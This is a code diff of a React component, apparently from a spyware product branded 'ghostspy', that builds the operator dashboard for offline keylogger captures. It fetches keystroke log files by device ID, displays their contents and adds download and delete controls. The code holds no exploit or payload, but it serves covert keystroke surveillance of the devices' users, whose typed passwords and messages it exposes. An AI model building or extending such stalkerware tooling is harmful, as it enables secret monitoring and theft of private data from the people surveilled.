@@ -1,15 +1,16 @@
 import React, { useState, useEffect } from "react";
 import toast from "react-hot-toast";
-
 import { useTranslation } from "react-i18next";
-import { Typography, CardMedia, Box } from "@mui/material";
+import { Typography, CardMedia, Box, IconButton } from "@mui/material";
+
+import DownloadIcon from "@mui/icons-material/Download";
+import DeleteIcon from "@mui/icons-material/Delete";
 
 import { useSocketFunctions } from "../../utils/socket";
-import { SocketIOPublicEvents } from "../../sections/settings/setting-socket";
 import { useSocket } from "../../hooks/use-socket";
 import MonitorViewer from "../monitorViewer";
 import Color from "src/theme/colors";
-import { formatDate } from "../../utils/common";
+import { getOfflineKeyLogs, removeKeyLogsFile } from "src/store/actions/keylog.action";
 
 const OfflineKeyLogsMonitorViewer = ({ monitor, device, onClose }) => {
   const { t } = useTranslation();
@@ -18,17 +19,23 @@ const OfflineKeyLogsMonitorViewer = ({ monitor, device, onClose }) => {
 
   const [changeLoading, setChangeLoading] = useState(false);
   const [recieveKeyLogs, setRecieveKeyLogs] = useState([]);
+  const [selectedLog, setSelectedLog] = useState(null); // For storing the selected file content
 
   useEffect(() => {
     setRecieveKeyLogs([]);
-
     init();
   }, [monitor]);
 
   const init = async () => {
     setChangeLoading(true);
     try {
-      console.log(">>>>>>>>>>");
+      if (device) {
+        const response = await getOfflineKeyLogs({ deviceId: device?.deviceId });
+
+        if (response && Array.isArray(response)) {
+          setRecieveKeyLogs(response); // Set the list of logs
+        }
+      }
     } catch (error) {
       toast.error(t("toast.error.server-error"), {
         position: "bottom-center",
@@ -44,8 +51,64 @@ const OfflineKeyLogsMonitorViewer = ({ monitor, device, onClose }) => {
     }
   };
 
+  const handleLogClick = (log) => {
+    setSelectedLog(log);
+  };
+
+  // Download Keylogs
+  const onKeyLogsDownload = (filename, content) => {
+    const blob = new Blob([content], { type: "text/plain" });
+    const link = document.createElement("a");
+    link.href = URL.createObjectURL(blob);
+    link.download = filename;
+    link.click();
+  };
+
+  // Remove keylogs file
+  const onKeyLogFilesRemove = async (filename) => {
+    const deviceId = device?.deviceId;
+
+    const res = await removeKeyLogsFile({
+      deviceId,
+      filename,
+    });
+
+    if (res?.status === 200) {
+      toast.success(`${filename} ${t("toast.success.keylog-remove")}`, {
+        position: "bottom-center",
+        reverseOrder: false,
+        duration: 5000,
+        style: {
+          backgroundColor: Color.background.green_gray01,
+          borderRadius: "5px",
+          padding: "3px 10px",
+          minWidth: "250px",
+        },
+      });
+
+      // Remove the file from the state
+      setRecieveKeyLogs((prevLogs) => prevLogs.filter((log) => log.filename !== filename));
+      // Clear the selection if the removed file was selected
+      if (selectedLog && selectedLog.filename === filename) {
+        setSelectedLog(null);
+      }
+    } else {
+      toast.error(t("toast.error.server-error"), {
+        position: "bottom-center",
+        reverseOrder: false,
+        duration: 5000,
+        style: {
+          backgroundColor: Color.background.red_gray01,
+          borderRadius: "5px",
+          padding: "3px 10px",
+        },
+      });
+    }
+  };
+
   const onCloseModal = () => {
     setRecieveKeyLogs([]);
+    setSelectedLog(null);
     onClose(false);
   };
 
@@ -63,70 +126,136 @@ const OfflineKeyLogsMonitorViewer = ({ monitor, device, onClose }) => {
       }}
       onClose={onCloseModal}
     >
-      <Box sx={{ position: "relative", width: "100%", height: "100%" }}>
+      <Box
+        sx={{ position: "relative", display: "flex", width: "100%", height: "100%", gap: "10px" }}
+      >
+        {/* Left part: List of TXT files */}
         <Box
           sx={{
-            display: "flex",
-            flexDirection: "column",
-            alignItems: "center",
-            pt: 2,
-            width: "100%",
+            width: "30%",
+            borderRight: `1px solid ${Color.background.border}`,
             height: "100%",
+            overflowY: "auto",
+            p: 1,
+            border: `solid 1px ${Color.background.border}`,
           }}
         >
-          <Box
-            sx={{
-              display: "flex",
-              flexDirection: "column",
-              justifyContent: "center",
-              width: "100%",
-              height: "100%",
-            }}
-          >
+          {recieveKeyLogs.length === 0 ? (
             <Box
               sx={{
-                backgroundColor: "black",
-                border: `solid 1px ${Color.background.border}`,
-                borderRadius: "5px",
-                height: "500px",
-                p: 1,
-                overflowY: "auto",
+                display: "flex",
+                alignItems: "center",
+                height: "100%",
               }}
             >
-              {changeLoading ? (
-                <Box
+              <Typography
+                sx={{
+                  width: "100%",
+                  color: Color.text.secondary,
+                  fontSize: "14px",
+                  textAlign: "center",
+                }}
+              >
+                {t("devicesPage.monitors.offline-keylog-empty")}
+              </Typography>
+            </Box>
+          ) : (
+            recieveKeyLogs.map((log, index) => (
+              <Box
+                key={index}
+                onClick={() => handleLogClick(log)}
+                sx={{
+                  display: "flex",
+                  justifyContent: "space-between",
+                  alignItems: "center",
+                  px: "5px",
+                  py: "2px",
+                  mb: "5px",
+                  backgroundColor: log === selectedLog ? Color.background.purple_opacity : "none",
+                  "&:hover": {
+                    backgroundColor: Color.background.purple_opacity,
+                  },
+                }}
+              >
+                <Typography
                   sx={{
-                    position: "absolute",
-                    top: 0,
-                    left: 0,
-                    right: 0,
-                    bottom: 0,
-                    display: "flex",
-                    justifyContent: "center",
-                    alignItems: "center",
-                    zIndex: 1,
-                    color: "white",
+                    width: "100%",
+                    cursor: "default",
+                    color: log === selectedLog ? Color.text.primary : Color.text.primary,
                   }}
                 >
-                  <CardMedia
-                    component="img"
-                    src="/assets/logos/spy/ghostspy-logo-_2_.webp"
-                    sx={{ cursor: "default", width: "auto", height: "auto" }}
+                  {log.filename}
+                </Typography>
+
+                {/* Icons: Download and Remove */}
+                <Box sx={{ display: "flex", alignItems: "center", gap: "7px" }}>
+                  <DownloadIcon
+                    onClick={() => onKeyLogsDownload(log.filename, log.content)}
+                    sx={{
+                      color: Color.background.purple,
+                      border: `solid 1px ${Color.background.purple}`,
+                      fontSize: "20px",
+                      cursor: "pointer",
+                      "&:hover": {
+                        color: "inherit",
+                        backgroundColor: Color.background.purple,
+                      },
+                    }}
+                  />
+
+                  {/* Delete Icon */}
+                  <DeleteIcon
+                    onClick={() => onKeyLogFilesRemove(log.filename)}
+                    sx={{
+                      color: Color.background.red_gray01,
+                      border: `solid 1px ${Color.background.red_gray01}`,
+                      fontSize: "20px",
+                      cursor: "pointer",
+                      "&:hover": {
+                        color: "inherit",
+                        backgroundColor: Color.background.red_gray01,
+                      },
+                    }}
                   />
                 </Box>
-              ) : (
-                <Box
-                  sx={{
-                    display: "flex",
-                    justifyContent: "space-between",
-                    alignItems: "center",
-                  }}
-                >
-                  Test
-                </Box>
-              )}
+              </Box>
+            ))
+          )}
+        </Box>
+
+        {/* Right part: Show content of the selected TXT file */}
+        <Box
+          sx={{
+            width: "70%",
+            height: "100%",
+            p: 2,
+            overflowY: "auto",
+            backgroundColor: "black",
+            border: `solid 1px ${Color.background.border}`,
+            color: "white",
+            borderRadius: "5px",
+          }}
+        >
+          {selectedLog ? (
+            <Box>
+              <Typography variant="h6">{selectedLog.filename}</Typography>
+              <pre>{selectedLog.content}</pre>
             </Box>
-          </Box>
+          ) : (
+            <Box
+              sx={{
+                width: "100%",
+                height: "100%",
+                display: "flex",
+                alignItems: "center",
+                justifyContent: "center",
+              }}
+            >
+              <Typography sx={{ fontSize: "14px", color: Color.text.secondary }}>
+                {t("devicesPage.monitors.offline-keylog-content-empty")}
+              </Typography>
+            </Box>
+          )}
         </Box>
       </Box>
     </MonitorViewer>
